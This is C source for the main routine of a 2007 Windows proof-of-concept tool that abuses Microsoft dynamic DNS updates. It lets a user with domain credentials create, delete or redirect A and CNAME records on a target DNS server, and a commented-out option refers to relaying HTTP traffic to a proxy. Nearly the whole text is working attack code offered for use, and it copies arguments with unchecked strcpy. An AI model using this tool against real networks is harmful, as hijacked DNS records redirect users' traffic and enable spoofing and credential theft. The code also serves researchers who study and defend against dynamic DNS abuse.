int main(int argc, char *argv[]) {
   
   HANDLE creds;
   DNS_RECORDA *result;
   DNS_STATUS status;
   
   HANDLE ContextHandle;
   DWORD Options=DNS_UPDATE_SECURITY_ON;
   PVOID pReserved=NULL;
   IN_ADDR ipaddr;
   IP4_ARRAY *servers=NULL;
   SEC_WINNT_AUTH_IDENTITY_A *Credentials=NULL;
   WORD i;
      
   printf(" Microsoft Dynamic DNS Updates - Proof of Concept\n");
   printf(" http://www.514.es - (c) 2007 Andres Tarasco Acuña\n\n");
   if (argc==1) usage(argv);
      
   //Init Credentials Struct
   Credentials = (SEC_WINNT_AUTH_IDENTITY_A *)malloc(sizeof(SEC_WINNT_AUTH_IDENTITY_A));
   memset(Credentials,'\0',sizeof(SEC_WINNT_AUTH_IDENTITY_A));
   Credentials->Flags=SEC_WINNT_AUTH_IDENTITY_ANSI;   
   for(i=1;i<argc;i++) {
      if ( (argv[i][0]=='-') ) {
         switch (argv[i][1]) {
         case 's':
         case 'S':
            strcpy(TargetDnsServer,argv[i+1]);
            servers=(PIP4_ARRAY)malloc(sizeof(IP4_ARRAY));
            servers->AddrCount=1;
            servers->AddrArray[0]=inet_addr(TargetDnsServer);
            break;
         case 'D':
         case 'd':
            strcpy(DeleteDnsRecord,argv[i+1]);
            break;                    
         case 'q':
         case 'Q':
            strcpy(TargetDnsRecord,argv[i+1]);
            break;
         case 'u':
         case 'U':
            strcpy(NewIpAddress,argv[i+1]);
            break;
         case 'c':
         case 'C':
            strcpy(CreateDnsRecord,argv[i+1]);
            if (NewIpAddress[0]=='\0') strcpy(NewIpAddress,"127.0.0.1");
            if (argv[i][2]!='\0') {
               switch (argv[i][2]) {
               case 'c': CreationType=DNS_TYPE_CNAME;
                  break;
               case 'a': CreationType=DNS_TYPE_A;
                  break;
               }
            }
            break;           
            /*
            case 'f':
               CreateThread( NULL,0,HttpRelayToProxy,(LPVOID) &i,0,&dwThreadId);
               break;
            case 'au': //Uauthorization serName
            Credentials->User=argv[i+1]; Credentials->UserLength=strlen(argv[i+1]);   break;
            case 'ap':
            Credentials->Password=argv[i+1];Credentials->PasswordLength=strlen(argv[i+1]); break;
            case 'ad':
            Credentials->Domain=argv[i+1]; Credentials->DomainLength=strlen(argv[i+1]);  break;     
            */
         default:
            printf("[-] Invalid argument: %s\n",argv[i]);
            usage(argv);
            break;
         }
         i++;            
      } else usage(argv);
   }
   
   printf("[+] Gathering Credentials..\n");
   //http://msdn2.microsoft.com/en-us/library/ms682007.aspx
   if (Credentials->UserLength==0) {
      status=DnsAcquireContextHandle(FALSE,NULL,&ContextHandle); //Context with default Credentials
   } else {
      status=DnsAcquireContextHandle(FALSE,Credentials,&ContextHandle); //Context with Custom Credentials
   }
   
   if (status == ERROR_SUCCESS) {          
      if (CREATERECORD) {
         
         result=(PDNS_RECORDA)malloc(sizeof(DNS_RECORDA));
         memset(result,'\0',sizeof(DNS_RECORDA));
         result->wType=CreationType; //DNS_TYPE_A by default
         if (CreationType==DNS_TYPE_CNAME) {
            printf("[+] Creating DNS CName Record for %s (%s)\n",CreateDnsRecord,NewIpAddress);
            result->Data.Cname.pNameHost=NewIpAddress;
         } else {
            printf("[+] Creating DNS A Record for %s (%s)\n",CreateDnsRecord,NewIpAddress);
            result->Data.A.IpAddress=inet_addr(NewIpAddress);
         } 
         result->pName=CreateDnsRecord;
         result->wDataLength=4;
         result->Flags.S.Section=1;
         result->Flags.S.CharSet=DnsCharSetAnsi;
         result->pNext=NULL;       

         status=DnsModifyRecordsInSet_A(result,  //add record
            NULL, //delete record
            Options,
            ContextHandle,
            servers,
            NULL);
         if (status ==ERROR_SUCCESS) {
            printf("[+] Host Created. Rechecking Record...\n");
            DnsRecordListFree(result,DnsFreeRecordList);
            result=DnsQueryA(CreateDnsRecord,servers);
         } else {
            printf("[-] Error: Unable to create  %s (%i)\n",CreateDnsRecord,status);
         }      
      } else if (DELETERECORD) {         
         printf("[+] Trying to resolve Host: %s before deleting\n",DeleteDnsRecord);
         result=DnsQueryA(DeleteDnsRecord,servers);
         if (result!=NULL) {
            printf("[+] Trying to Delete Record. Are You Sure? (Y/N)...");
            i=getchar(); if (i!='y') return(-1);
            printf("[+] Deleting record %s\n",DeleteDnsRecord);   
            status=DnsModifyRecordsInSet_A(NULL,  //add record
               result, //delete record
               Options,
               ContextHandle,
               servers,
               NULL);      
            if (status ==ERROR_SUCCESS) {
               printf("[+] Host Deleted. Rechecking Record %s...\n",DeleteDnsRecord);
               DnsRecordListFree(result,DnsFreeRecordList);
               result=DnsQueryA(DeleteDnsRecord,servers);
            } else {
               printf("[-] Error: Unable to Delete %s\n",DeleteDnsRecord);
            }
         } else {
            printf("[-] Host %s not found\n",DeleteDnsRecord);
         }

      } else if (UPDATERECORD) {
         //         exit(1);
         printf("[+] Trying to resolve Host: %s before updating\n",TargetDnsRecord);
         result=DnsQueryA(TargetDnsRecord,servers);
         if (result->wType==DNS_TYPE_A ) {
            printf("[+] Trying to update record. Are You Sure? (Y/N)...");
            i=getchar(); if (i!='y') return(-1);
            result->Data.A.IpAddress=inet_addr(NewIpAddress);//Modify Dns record
            ipaddr.S_un.S_addr = (result->Data.A.IpAddress);
            printf("[+] Trying to set ip address of the host %s to %s \n", TargetDnsRecord,NewIpAddress);//inet_ntoa(ipaddr));
            printf("[+] Trying to Modify Record...\n");
            status=DnsReplaceRecordSetA(result,
               Options, //Attempts nonsecure dynamic update. If refused, then attempts secure dynamic update.
               ContextHandle,
               servers,//pServerList,
               NULL);//pReserved
            if (status ==ERROR_SUCCESS) {
               printf("[+] Host Updated. Rechecking Record...\n");
               DnsRecordListFree(result,DnsFreeRecordList);
               result=DnsQueryA(TargetDnsRecord,servers);
            } else {
               printf("[-] Error: Unable to Delete %s\n",TargetDnsRecord);
            }

         } else {
            printf("[-] Unable to Update Record (Type %x)\n",result->wType);
            }
      } else if (QUERYRECORD) {
         printf("[+] Query Information for host %s...\n",TargetDnsRecord);
         result=DnsQueryA(TargetDnsRecord,servers);
         DnsRecordListFree(result,DnsFreeRecordList);         
      } else {
         printf("[-] Unknown Options\n");
         return(-1);
      }           
   } else {
      printf("[-] Error Calling DnsAcquireContextHandle\n");   
   }
   return (1);
}